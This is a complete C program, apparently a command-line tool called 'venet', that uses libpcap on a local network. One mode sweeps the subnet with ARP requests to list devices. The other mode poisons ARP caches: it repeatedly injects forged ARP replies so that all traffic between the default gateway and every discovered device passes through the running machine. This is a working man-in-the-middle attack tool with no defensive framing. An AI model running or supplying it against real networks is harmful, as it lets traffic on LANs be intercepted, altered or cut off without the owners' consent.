#include <pcap.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <netpacket/packet.h>
#include <netinet/ether.h>
#include <sys/wait.h>
#include <signal.h>
#include <string.h>
#include <time.h>

#define ETH_ADDRSTRLEN 18
#define INET_ALEN 4
#define LIMIT 255

char ip_rtv[LIMIT][INET_ALEN];
char mac_rtv[LIMIT][ETH_ALEN];
bool sig_rtv = false;
bool entire = false;
bool find = false;
int count;

void info(void) {

	printf("\n-f\tFind devices available on your LAN (ARP)\n");
	printf("-e\tAct as the default gateway for all available devices\n");
	printf("-h\tShow this information\n");
	printf("-v\tShow version information\n\n");

	return;
}

void analyze(int argc, char *argv[]) {

	char *version = "1.0";
	int index;

	if(argc < 2) {
		info();

		exit(EXIT_FAILURE);
	}

	while((index = getopt(argc, argv, "fehv")) != -1) {
		switch(index) {
			case 'f':
				find = true;
				break;
			case 'e':
				entire = true;
				break;
			case 'h':
				info();

				exit(EXIT_FAILURE);
			case 'v':
				printf("venet %s\n", version);

				exit(EXIT_FAILURE);
			default:
				exit(EXIT_FAILURE);
		}
	}

	if(find == true && entire == true) {
		printf("%s: cannot find devices and take over their traffic concurrently!\n", argv[0]);

		exit(EXIT_FAILURE);
	}

	return;
}

void retrieve(char *argv, pcap_if_t *devs, char *my_mac, int *my_ip, int *my_mask) {

	struct sockaddr_ll *sll;
	struct sockaddr_in *sin;
	bool mac_rtv = false;
	bool ip_rtv = false;
	bool mask_rtv = false;
	pcap_addr_t *addr;

	for(addr = devs->addresses; addr; addr = addr->next) {
		if(addr->addr->sa_family == AF_PACKET) {
			sll = (struct sockaddr_ll *)addr->addr;
			memcpy(my_mac, sll->sll_addr, ETH_ALEN);
			mac_rtv = true;
		}

		if(addr->addr->sa_family == AF_INET) {
			sin = (struct sockaddr_in *)addr->addr;
			memcpy(my_ip, &sin->sin_addr.s_addr, INET_ALEN);
			ip_rtv = true;

			sin = (struct sockaddr_in *)addr->netmask;
			memcpy(my_mask, &sin->sin_addr.s_addr, INET_ALEN);
			mask_rtv = true;
		}
	}

	if(mac_rtv != true || ip_rtv != true || mask_rtv != true) {
		printf("%s: cannot retrieve interface addresses!\n", argv);
		pcap_freealldevs(devs);

		exit(EXIT_FAILURE);
	}

	return;
}

void examine(char *argv, pcap_if_t *devs, char *gtw_ip) {

	bool gtw_rtv = false;
	char outbuf[LIMIT];
	int tmp;
	FILE *out;

	if((out = fopen("/proc/net/route", "r")) == NULL) {
		printf("%s: cannot examine /proc/net/route!\n", argv);
		pcap_freealldevs(devs);

		exit(EXIT_FAILURE);
	}

	while(fgets(outbuf, sizeof(outbuf), out) != 0) {
		strtok(outbuf, "\t");

		if(strcmp(strtok(NULL, "\t"), "00000000") == 0) {
			tmp = strtol(strtok(NULL, "\t"), NULL, 16);
			inet_ntop(AF_INET, &tmp, gtw_ip, INET_ADDRSTRLEN);
			gtw_rtv = true;
		}
	}

	fclose(out);

	if(gtw_rtv == false) {
		printf("%s: cannot retrieve the default gateway IP!\n", argv);
		pcap_freealldevs(devs);

		exit(EXIT_FAILURE);
	}

	return;
}

void create(char *frame, char op, char *my_mac, int *my_ip, int *crt_ip, char *tgt_mac, char *tgt_ip) {

	struct ether_header *eth;
	struct ether_arp *arp;

	eth = (struct ether_header *)frame;

	eth->ether_type = htons(ETHERTYPE_ARP);

	arp = (struct ether_arp *)(frame + sizeof(struct ether_header));

	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETHERTYPE_IP);
	arp->arp_hln = ETH_ALEN;
	arp->arp_pln = INET_ALEN;

	if(op == ARPOP_REQUEST) {
		arp->arp_op = htons(ARPOP_REQUEST);

		memcpy(eth->ether_shost, my_mac, ETH_ALEN);
		ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)eth->ether_dhost);

		memcpy(arp->arp_sha, my_mac, ETH_ALEN);
		ether_aton_r("00:00:00:00:00:00", (struct ether_addr *)arp->arp_tha);

		memcpy(arp->arp_spa, my_ip, INET_ALEN);
		memcpy(arp->arp_tpa, crt_ip, INET_ALEN);
	}

	if(op == ARPOP_REPLY) {
		arp->arp_op = htons(ARPOP_REPLY);

		memcpy(eth->ether_shost, my_mac, ETH_ALEN);
		memcpy(eth->ether_dhost, tgt_mac, ETH_ALEN);

		memcpy(arp->arp_sha, my_mac, ETH_ALEN);
		memcpy(arp->arp_tha, tgt_mac, ETH_ALEN);

		inet_pton(AF_INET, tgt_ip, &arp->arp_spa);
		inet_pton(AF_INET, tgt_ip, &arp->arp_tpa);
	}

	return;
}

void monitor(unsigned char *crt_ip, const struct pcap_pkthdr *pkt, const unsigned char *bytes) {

	struct ether_header *frame;
	struct ether_arp *arp;

	frame = (struct ether_header *)bytes;

	arp = (struct ether_arp *)(bytes + sizeof(struct ether_header));

	if(ntohs(frame->ether_type) == ETHERTYPE_ARP) {
		if(memcmp(arp->arp_spa, (int *)crt_ip, INET_ALEN) == 0) {
			memcpy(ip_rtv[count], arp->arp_spa, INET_ALEN);
			memcpy(mac_rtv[count], arp->arp_sha, ETH_ALEN);
		}
	}

	return;
}

void catch(int num) {

	sig_rtv = 1;

	return;
}

int main(int argc, char *argv[]) {

	pcap_t *dev;
	pcap_if_t *devs;
	char ent_frame[LIMIT * 2][sizeof(struct ether_header) + sizeof(struct ether_arp)];
	char tmp_frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	char errbuf[PCAP_ERRBUF_SIZE];
	char tmp_ip[INET_ADDRSTRLEN];
	char gtw_ip[INET_ADDRSTRLEN];
	char my_mac[ETH_ALEN];
	char gtw_mac[ETH_ALEN];
	int my_ip, my_mask;
	int str_ip, end_ip;
	int crt_ip, prv_ip;
	int tmp = 0;
	int status;
	int inx;

	analyze(argc, argv);

	pcap_findalldevs(&devs, errbuf);

	if(strcmp(devs->name, "lo") == 0) {
		printf("%s: no suitable interface available!\n", argv[0]);
		pcap_freealldevs(devs);

		exit(EXIT_FAILURE);
	}

	retrieve(argv[0], devs, my_mac, &my_ip, &my_mask);

	examine(argv[0], devs, gtw_ip);

	dev = pcap_create(devs->name, errbuf);

	pcap_set_timeout(dev, 10);

	if((status = pcap_activate(dev)) < 0) {
		printf("%s: root permissions unavailable!\n", argv[0]);
		pcap_freealldevs(devs);
		pcap_close(dev);

		exit(EXIT_FAILURE);
	}

	pcap_setnonblock(dev, 1, errbuf);

	signal(SIGTERM, catch);
	signal(SIGINT, catch);

	if(find == true || entire == true) {
		str_ip = ntohl(my_ip & my_mask);
		end_ip = ntohl(my_ip | ~my_mask);

		for(prv_ip = ++str_ip; prv_ip < end_ip; prv_ip++) {
			if(sig_rtv == 1)
				break;

			crt_ip = htonl(prv_ip);

			create(tmp_frame, ARPOP_REQUEST, my_mac, &my_ip, &crt_ip, NULL, NULL);

			pcap_inject(dev, tmp_frame, sizeof(tmp_frame));

			nanosleep((struct timespec[]){{ 0, 50000000 }}, NULL);

			pcap_dispatch(dev, 0, monitor, (unsigned char *)&crt_ip);

			inet_ntop(AF_INET, ip_rtv[count], tmp_ip, sizeof(tmp_ip));

			if(strcmp(tmp_ip, "0.0.0.0") == 0)
				continue;

			if(entire == true && strcmp(gtw_ip, tmp_ip) == 0) {
				memcpy(gtw_mac, mac_rtv[count], ETH_ALEN);

				continue;
			}

			printf("%s\n", tmp_ip);

			if(++count == LIMIT) {
				printf("\n%s: cannot examine more than %d devices!\n", argv[0], LIMIT);

				pcap_freealldevs(devs);
				pcap_close(dev);

				exit(EXIT_FAILURE);
			}
		}

		if(entire == true) {
			if(count < 1) {
				printf("%s: the only available device was the default gateway!\n", argv[0]);

				pcap_freealldevs(devs);
				pcap_close(dev);

				exit(EXIT_FAILURE);
			}

			for(inx = 0; inx < count; inx++) {
				inet_ntop(AF_INET, ip_rtv[inx], tmp_ip, sizeof(tmp_ip));

				create(tmp_frame, ARPOP_REPLY, my_mac, NULL, NULL, mac_rtv[inx], gtw_ip);
				memcpy(ent_frame[tmp++], tmp_frame, sizeof(tmp_frame));

				create(tmp_frame, ARPOP_REPLY, my_mac, NULL, NULL, gtw_mac, tmp_ip);
				memcpy(ent_frame[tmp++], tmp_frame, sizeof(tmp_frame));
			}

			printf("\nThe traffic between the default gateway and these devices runs through this computer...\n");

			for(;;) {
				if(sig_rtv == 1)
					break;

				for(inx = 0; inx < tmp; inx++) {
					pcap_inject(dev, ent_frame[inx], sizeof(tmp_frame));

					nanosleep((struct timespec[]){{ 0, 50000000 }}, NULL);
				}

				sleep(5);
			}
		}
	}

	pcap_freealldevs(devs);
	pcap_close(dev);

	return(0);
}
